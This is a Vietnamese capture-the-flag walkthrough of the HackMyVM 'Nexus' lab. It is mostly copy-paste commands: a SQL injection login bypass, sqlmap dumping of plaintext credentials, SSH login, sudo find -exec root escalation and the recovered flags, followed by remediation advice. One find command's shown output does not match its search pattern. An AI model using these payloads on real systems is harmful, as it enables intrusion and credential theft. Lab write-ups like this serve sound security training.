# HackMyVM — Nexus

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Nexus (Target) | `10.0.2.16` |
| Hostname | `NexusLabCTF` |
| SSH | `22/tcp` — OpenSSH 9.2p1 Debian 2+deb12u5 |
| HTTP | `80/tcp` — Apache 2.4.62 (Debian) |
| Database | `Nebuchadnezzar` |
| Table | `users` |
| User | `shelly` |
| User flag | `82kd8FJ5SJ00HMVUS3R36gd` |
| Root flag | `p3vhKP9d97a7HMV79ad9ks2s9` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal Kali**: trinh sát, quét dịch vụ, enumeration web, SQL injection/SQLMap và SSH.
> - 🟥 **Terminal Nexus**: kiểm tra tài khoản, sudo, tìm flag và leo thang đặc quyền sau khi SSH.
>
> Không chạy nhầm lệnh giữa 2 máy.

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy và các thông tin có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Xác định IP Target

### 🟦 Kali

```bash
nmap -sn 10.0.2.0/24
```

Target được xác định là:

```text
10.0.2.16
```

Đặt biến:

```bash
export IP=10.0.2.16
```

Kiểm tra kết nối:

```bash
ping -c 4 $IP
```

---

## 1.2. Quét toàn bộ TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 --min-rate 5000 $IP
```

Kết quả quan trọng:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Hai cổng TCP mở:

```text
22/tcp  SSH
80/tcp  HTTP
```

> `-p-` quét toàn bộ 65535 TCP ports. `-Pn` bỏ qua host discovery. `-T4` tăng tốc độ. `--min-rate 5000` đặt tốc độ gửi tối thiểu.

---

## 1.3. Nhận diện dịch vụ và phiên bản

### 🟦 Kali

```bash
nmap -sC -sV -Pn -T4 -p22,80 $IP
```

Kết quả thực tế:

```text
22/tcp open  ssh  OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp open  http Apache httpd 2.4.62 ((Debian))
```

Thông tin chính:

```text
22/tcp → OpenSSH 9.2p1
80/tcp → Apache 2.4.62
OS     → Linux/Debian
```

---

## 1.4. Quét UDP

### 🟦 Kali

```bash
sudo nmap -sU --top-ports 100 -T2 --max-retries 2 $IP
```

Kết quả quan sát được:

```text
68/udp  open|filtered  dhcpc
```

`open|filtered` **không phải bằng chứng chắc chắn rằng UDP/68 đang mở**. Nmap không phân biệt được giữa trạng thái mở và bị lọc. Vì vậy hướng chính vẫn là `22/tcp` và `80/tcp`.

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Khai thác các điểm yếu phát hiện được để đạt quyền truy cập ban đầu, leo thang đặc quyền và tìm `user flag` तथा `root flag`.**

## 2.1. Kiểm tra HTTP

### 🟦 Kali

```bash
curl -I http://$IP
```

Kết quả chính:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.62 (Debian)
Content-Type: text/html
```

Lưu trang chủ:

```bash
curl -s http://$IP/ -o nexus-index.html
cat nexus-index.html
```

Kiểm tra liên kết/form:

```bash
grep -Eoi '(href|src|action)="[^"]+"' nexus-index.html
```

Trang chủ không cung cấp ngay endpoint đăng nhập rõ ràng, vì vậy chuyển sang directory enumeration.

---

## 2.2. Web directory enumeration

### 🟦 Kali

Nếu chưa có SecLists:

```bash
sudo apt update
sudo apt install seclists -y
```

Chạy Feroxbuster:

```bash
feroxbuster --url http://$IP \
-w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
-x php,txt,html,zip,log,bin
```

Kết quả quan trọng:

```text
200 GET 47l  86w   825c   http://10.0.2.16/
200 GET 47l  86w   825c   http://10.0.2.16/index.html
200 GET 1641l 5430w 75134c http://10.0.2.16/index2.php
200 GET 26l   36w   352c   http://10.0.2.16/login.php
```

Endpoint đáng chú ý:

```text
/index2.php
/login.php
```

---

## 2.3. Phân tích `/index2.php`

### 🟦 Kali

```bash
curl -i http://$IP/index2.php
```

Lưu lại:

```bash
curl -s http://$IP/index2.php -o index2.html
```

Tìm các path/URL:

```bash
grep -Eoi '(https?://[^"'"' ]+|/[A-Za-z0-9_./?-]+)' index2.html | sort -u
```

Endpoint quan trọng:

```text
/auth-login.php
```

---

## 2.4. Phân tích `/auth-login.php`

### 🟦 Kali

```bash
curl -s http://$IP/auth-login.php -o auth-login.html
```

```bash
grep -Ein "form|input|action|method|user|pass|login" auth-login.html
```

Form thực tế:

```html
<form method="POST" action="login.php">
<input type="text" name="user" placeholder="Usuario" required>
<input type="password" name="pass" placeholder="Contraseña" required>
<input type="submit" value="Ingresar">
```

Suy ra:

```text
POST /login.php
user=<username>
pass=<password>
```

---

## 2.5. Xác nhận SQL Injection thủ công

### 🟦 Kali

```bash
curl -i -X POST http://$IP/login.php \
-d "user=%27+or+1%3D1--+-&pass=test"
```

Kết quả thực tế có:

```text
Acceso concedido. Bienvenido, ' or 1=1-- -.
```

Như vậy tham số:

```text
user
```

có khả năng bị SQL Injection.

Chuỗi tấn công:

```text
/auth-login.php
      ↓
POST /login.php
      ↓
user parameter
      ↓
SQL Injection
```

---

## 2.6. SQLMap — liệt kê database

### 🟦 Kali

```bash
sqlmap -u "http://$IP/auth-login.php" --forms --dbs --batch
```

DBMS được SQLMap nhận diện là MySQL/MariaDB fork.

Database phát hiện được:

```text
information_schema
mysql
Nebuchadnezzar
performance_schema
sion
sys
```

Database cần tiếp tục kiểm tra:

```text
Nebuchadnezzar
```

---

## 2.7. SQLMap — liệt kê table

### 🟦 Kali

```bash
sqlmap -u "http://$IP/auth-login.php" \
--forms \
-D Nebuchadnezzar \
--tables \
--batch
```

Kết quả:

```text
Database: Nebuchadnezzar
[1 table]
| users |
```

---

## 2.8. SQLMap — liệt kê column

### 🟦 Kali

```bash
sqlmap -u "http://$IP/auth-login.php" \
--forms \
-D Nebuchadnezzar \
-T users \
--columns \
--batch
```

Kết quả:

```text
Database: Nebuchadnezzar
Table: users

| id       | int(11)      |
| password | varchar(255) |
| username | varchar(50)  |
```

Các cột chứa credential:

```text
username
password
```

---

## 2.9. SQLMap — dump credential

### 🟦 Kali

```bash
sqlmap -u "http://$IP/auth-login.php" \
--forms \
-D Nebuchadnezzar \
-T users \
-C username,password \
--dump \
--batch
```

Kết quả thực tế:

```text
Database: Nebuchadnezzar
Table: users

| username | password           |
| admin    | cambiame2025       |
| shelly   | F4ckTh3F4k3H4ck3r5 |
```

Credential dùng để kiểm tra SSH:

```text
Username: shelly
Password: F4ckTh3F4k3H4ck3r5
```

---

# 3. Truy cập SSH

## 3.1. SSH vào Nexus

### 🟦 Kali

```bash
ssh shelly@$IP
```

Nhập password:

```text
F4ckTh3F4k3H4ck3r5
```

### 🟥 Nexus

Kiểm tra tài khoản:

```bash
whoami
```

```text
shelly
```

Kiểm tra UID/GID:

```bash
id
```

```text
uid=1000(shelly) gid=1000(shelly)
```

Hostname:

```bash
hostname
```

```text
NexusLabCTF
```

---

# 4. Tìm User Flag

### 🟥 Nexus

```bash
find / -name user.txt 2>/dev/null
```

Kết quả:

```text
/home/shelly/SA/user-flag.txt
```

Đọc flag:

```bash
cat /home/shelly/SA/user-flag.txt
```

Kết quả:

```text
Flag User :: 82kd8FJ5SJ00HMVUS3R36gd
```

### 🏁 User Flag

```text
82kd8FJ5SJ00HMVUS3R36gd
```

---

# 5. Leo thang đặc quyền

## 5.1. Kiểm tra sudo

### 🟥 Nexus

```bash
sudo -l
```

Kết quả quan trọng:

```text
User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

Điều này có nghĩa `shelly` được phép chạy `/usr/bin/find` với quyền của user khác, bao gồm `root`, mà không cần password.

> Có thể xuất hiện cảnh báo:
>
> ```text
> sudo: unable to resolve host NexusLabCTF
> ```
>
> Đây là cảnh báo hostname resolution; trong lab nó không ngăn lệnh sudo hoạt động.

---

## 5.2. Lưu ý về `sudo -I`

Trong quá trình thao tác có thể đã nhập:

```bash
sudo -I
```

Hệ thống trả về lỗi option không hợp lệ. Lệnh cần dùng để xem quyền sudo là:

```bash
sudo -l
```

---

## 5.3. Khai thác `find`

### 🟥 Nexus

```bash
sudo -u root /usr/bin/find . -exec /bin/sh \; -quit
```

Kiểm tra:

```bash
whoami
```

```text
root
```

```bash
id
```

```text
uid=0(root) gid=0(root)
```

Chuỗi leo thang:

```text
shelly
  ↓
sudo NOPASSWD
  ↓
/usr/bin/find
  ↓
-exec /bin/sh
  ↓
root
```

---

# 6. Tìm Root Flag

## 6.1. Kiểm tra vị trí thông thường

### 🟥 Nexus

```bash
cat /root/root.txt
```

Kết quả:

```text
cat: /root/root.txt: No existe el fichero o el directorio
```

**Điều này không có nghĩa là chưa root.** Trước đó `whoami` và `id` đã xác nhận `uid=0(root)`. Chỉ có nghĩa root flag không nằm tại đường dẫn mặc định này.

---

## 6.2. Liệt kê `/root`

### 🟥 Nexus

```bash
ls -la /root
```

Thư mục đáng chú ý:

```text
/root/Sion-Code
```

Tìm file:

```bash
find /root -maxdepth 3 -type f -printf '%p\n' 2>/dev/null
```

Kết quả có:

```text
/root/Sion-Code/use-fim-to-root.png
```

---

## 6.3. Kiểm tra file

### 🟥 Nexus

```bash
ls -lah /root/Sion-Code/use-fim-to-root.png
```

```bash
stat /root/Sion-Code/use-fim-to-root.png
```

File có kích thước khoảng 71 KB và thuộc `root:root`.

Một số tool không có sẵn trên Target:

```bash
file /root/Sion-Code/use-fim-to-root.png
```

```text
file: not found
```

```bash
exiftool /root/Sion-Code/use-fim-to-root.png
```

```text
exiftool: not found
```

```bash
xxd -l 32 /root/Sion-Code/use-fim-to-root.png
```

```text
xxd: not found
```

Do đó dùng `od` và `strings`, là các công cụ có sẵn.

---

## 6.4. Phát hiện file không đúng extension

### 🟥 Nexus

```bash
od -An -tx1 -N32 /root/Sion-Code/use-fim-to-root.png
```

Kết quả bắt đầu:

```text
47 49 46 38 39 61
```

Chuỗi này tương ứng với:

```text
GIF89a
```

Kiểm tra bằng `strings`:

```bash
strings -n 6 /root/Sion-Code/use-fim-to-root.png | head -n 100
```

Kết quả bắt đầu bằng:

```text
GIF89a
```

Vì vậy:

```text
Tên file: .png
Nội dung thực tế: GIF
```

---

## 6.5. Tìm chuỗi flag

### 🟥 Nexus

```bash
strings -n 6 /root/Sion-Code/use-fim-to-root.png | grep -Ei 'flag|root|fim|hack|password|key'
```

Kết quả:

```text
;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]
```

### 🏁 Root Flag

```text
p3vhKP9d97a7HMV79ad9ks2s9
```

---

# 7. Chuỗi khai thác hoàn chỉnh

```text
┌────────────────────────────┐
│ 🟦 KALI                    │
│ 10.0.2.15                  │
└─────────────┬──────────────┘
              │ nmap -sn
              ▼
┌────────────────────────────┐
│ 🟥 NEXUS                   │
│ 10.0.2.16                  │
└─────────────┬──────────────┘
              │ TCP scan
              ▼
┌────────────────────────────┐
│ 22/tcp  SSH                │
│ 80/tcp  HTTP               │
└─────────────┬──────────────┘
              │ Feroxbuster
              ▼
┌────────────────────────────┐
│ /index2.php                │
│ /auth-login.php            │
│ /login.php                 │
└─────────────┬──────────────┘
              │ POST user/pass
              ▼
┌────────────────────────────┐
│ SQL Injection              │
│ parameter: user            │
└─────────────┬──────────────┘
              │ SQLMap
              ▼
┌────────────────────────────┐
│ DB: Nebuchadnezzar         │
│ Table: users               │
└─────────────┬──────────────┘
              │ dump credential
              ▼
┌────────────────────────────┐
│ shelly                     │
│ F4ckTh3F4k3H4ck3r5         │
└─────────────┬──────────────┘
              │ SSH
              ▼
┌────────────────────────────┐
│ shelly@NexusLabCTF         │
│ User flag                  │
└─────────────┬──────────────┘
              │ sudo -l
              ▼
┌────────────────────────────┐
│ NOPASSWD: /usr/bin/find    │
└─────────────┬──────────────┘
              │ find -exec /bin/sh
              ▼
┌────────────────────────────┐
│ uid=0(root)                │
└─────────────┬──────────────┘
              │ /root/Sion-Code/
              │ use-fim-to-root.png
              ▼
┌────────────────────────────┐
│ GIF89a + strings           │
└─────────────┬──────────────┘
              ▼
┌────────────────────────────┐
│ ROOT FLAG                  │
│ p3vhKP9d97a7HMV79ad9ks2s9  │
└────────────────────────────┘
```

---

# 8. Toàn bộ quá trình — Copy/Paste theo đúng thứ tự

## 🟦 TERMINAL KALI

```bash
nmap -sn 10.0.2.0/24
export IP=10.0.2.16
ping -c 4 $IP
nmap -p- -Pn -T4 --min-rate 5000 $IP
nmap -sC -sV -Pn -T4 -p22,80 $IP
sudo nmap -sU --top-ports 100 -T2 --max-retries 2 $IP
curl -I http://$IP
curl -s http://$IP/ -o nexus-index.html
cat nexus-index.html
grep -Eoi '(href|src|action)="[^"]+"' nexus-index.html
sudo apt update
sudo apt install seclists -y
feroxbuster --url http://$IP \
-w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
-x php,txt,html,zip,log,bin
curl -i http://$IP/index2.php
curl -s http://$IP/index2.php -o index2.html
grep -Eoi '(https?://[^"'"' ]+|/[A-Za-z0-9_./?-]+)' index2.html | sort -u
curl -s http://$IP/auth-login.php -o auth-login.html
grep -Ein "form|input|action|method|user|pass|login" auth-login.html
curl -i -X POST http://$IP/login.php \
-d "user=%27+or+1%3D1--+-&pass=test"
sqlmap -u "http://$IP/auth-login.php" --forms --dbs --batch
sqlmap -u "http://$IP/auth-login.php" --forms -D Nebuchadnezzar --tables --batch
sqlmap -u "http://$IP/auth-login.php" --forms -D Nebuchadnezzar -T users --columns --batch
sqlmap -u "http://$IP/auth-login.php" --forms -D Nebuchadnezzar -T users -C username,password --dump --batch
ssh shelly@$IP
```

Password SSH:

```text
F4ckTh3F4k3H4ck3r5
```

## 🟥 TERMINAL NEXUS

```bash
whoami
id
hostname
find / -name user.txt 2>/dev/null
cat /home/shelly/SA/user-flag.txt
sudo -l
sudo -u root /usr/bin/find . -exec /bin/sh \; -quit
whoami
id
cat /root/root.txt
ls -la /root
find /root -maxdepth 3 -type f -printf '%p\n' 2>/dev/null
ls -lah /root/Sion-Code/use-fim-to-root.png
stat /root/Sion-Code/use-fim-to-root.png
od -An -tx1 -N32 /root/Sion-Code/use-fim-to-root.png
strings -n 6 /root/Sion-Code/use-fim-to-root.png | head -n 100
strings -n 6 /root/Sion-Code/use-fim-to-root.png | grep -Ei 'flag|root|fim|hack|password|key'
```

---

# 9. Câu 3 — Nguyên nhân và biện pháp khắc phục

## 9.1. SQL Injection

### Nguyên nhân

Tham số `user` của login có thể bị thao túng bằng SQL syntax.

### Khắc phục

- Dùng prepared statements / parameterized queries.
- Không nối chuỗi input người dùng trực tiếp vào SQL.
- Validate input ở server.
- Không trả lỗi SQL chi tiết cho client.
- Áp dụng least privilege cho database account.
- Kiểm thử SQL injection định kỳ.

---

## 9.2. Credential plaintext trong database

SQLMap đọc được:

```text
admin  : cambiame2025
shelly : F4ckTh3F4k3H4ck3r5
```

Nếu đây là hệ thống thực tế, việc lưu password plaintext là rủi ro nghiêm trọng.

### Khắc phục

- Dùng Argon2id, bcrypt hoặc scrypt.
- Không lưu password plaintext.
- Không tái sử dụng password giữa web và SSH.
- Rotate credential khi bị lộ.
- Hạn chế quyền database.

---

## 9.3. Sudo NOPASSWD cho `find`

Cấu hình:

```text
(ALL) NOPASSWD: /usr/bin/find
```

cho phép thực thi `find` với quyền cao và `find` có khả năng gọi chương trình qua `-exec`.

### Khắc phục

- Xóa rule nếu không cần.
- Nếu bắt buộc phải cho phép, giới hạn command/argument chặt chẽ.
- Không cấp sudo cho binary có khả năng thực thi lệnh tùy ý.
- Rà soát sudoers định kỳ.
- Áp dụng least privilege.

---

## 9.4. Gia cố SSH

- Không dùng lại credential của ứng dụng cho SSH.
- Ưu tiên SSH key authentication.
- Tắt password authentication khi phù hợp.
- Giới hạn nguồn truy cập cổng 22 bằng firewall.
- Theo dõi login và brute-force attempts.
- Rotate credential ngay khi bị lộ.

---

## 9.5. Bảo vệ secret

Không lưu secret nhạy cảm trong:

```text
plaintext database
source code
logs
public endpoint
```

Secret nên được quản lý bằng cơ chế secret management phù hợp và chỉ cấp quyền tối thiểu.

---

# 10. Tổng hợp đáp án

## Câu 1 — Khảo sát

Target:

```text
10.0.2.16
```

Dịch vụ TCP:

```text
22/tcp  SSH — OpenSSH 9.2p1 Debian 2+deb12u5
80/tcp  HTTP — Apache 2.4.62 Debian
```

Web path quan trọng:

```text
/index2.php
/auth-login.php
/login.php
```

## Câu 2 — Khai thác

SQL Injection:

```text
POST /login.php
parameter: user
```

Database:

```text
Nebuchadnezzar
```

Table:

```text
users
```

Credential:

```text
shelly : F4ckTh3F4k3H4ck3r5
```

User flag:

```text
82kd8FJ5SJ00HMVUS3R36gd
```

Privilege escalation:

```text
sudo -l
    ↓
NOPASSWD: /usr/bin/find
    ↓
find -exec /bin/sh
    ↓
uid=0(root)
```

Root artifact:

```text
/root/Sion-Code/use-fim-to-root.png
```

Root flag:

```text
p3vhKP9d97a7HMV79ad9ks2s9
```

---

# 11. Checklist cuối bài

```text
[✓] Xác định Target 10.0.2.16
[✓] Ping xác nhận Target hoạt động
[✓] Quét toàn bộ TCP
[✓] Xác định 22/tcp SSH
[✓] Xác định 80/tcp HTTP
[✓] Service/version scan
[✓] Web enumeration
[✓] Tìm /index2.php
[✓] Tìm /auth-login.php
[✓] Xác định POST /login.php
[✓] Xác nhận SQL Injection
[✓] SQLMap enumerate database
[✓] Tìm database Nebuchadnezzar
[✓] Tìm table users
[✓] Tìm columns username/password
[✓] Dump credential shelly
[✓] SSH vào Target
[✓] Xác nhận user shelly
[✓] Tìm user flag
[✓] sudo -l
[✓] Phát hiện NOPASSWD /usr/bin/find
[✓] Leo thang thành root
[✓] Xác nhận uid=0
[✓] Tìm root artifact
[✓] Phân tích use-fim-to-root.png
[✓] Phát hiện GIF89a
[✓] strings + grep tìm root flag
[✓] Thu được root flag
```

---

# Kết luận

Chuỗi khai thác Nexus:

```text
Recon
  ↓
22/tcp + 80/tcp
  ↓
Web Enumeration
  ↓
/index2.php
  ↓
/auth-login.php
  ↓
POST /login.php
  ↓
SQL Injection
  ↓
SQLMap
  ↓
Nebuchadnezzar.users
  ↓
shelly / F4ckTh3F4k3H4ck3r5
  ↓
SSH
  ↓
sudo -l
  ↓
NOPASSWD: /usr/bin/find
  ↓
find -exec /bin/sh
  ↓
root
  ↓
/home/shelly/SA/user-flag.txt
  ↓
/root/Sion-Code/use-fim-to-root.png
  ↓
strings + grep
  ↓
ROOT FLAG
```

## 🏁 Flags

### User

```text
82kd8FJ5SJ00HMVUS3R36gd
```

### Root

```text
p3vhKP9d97a7HMV79ad9ks2s9
```
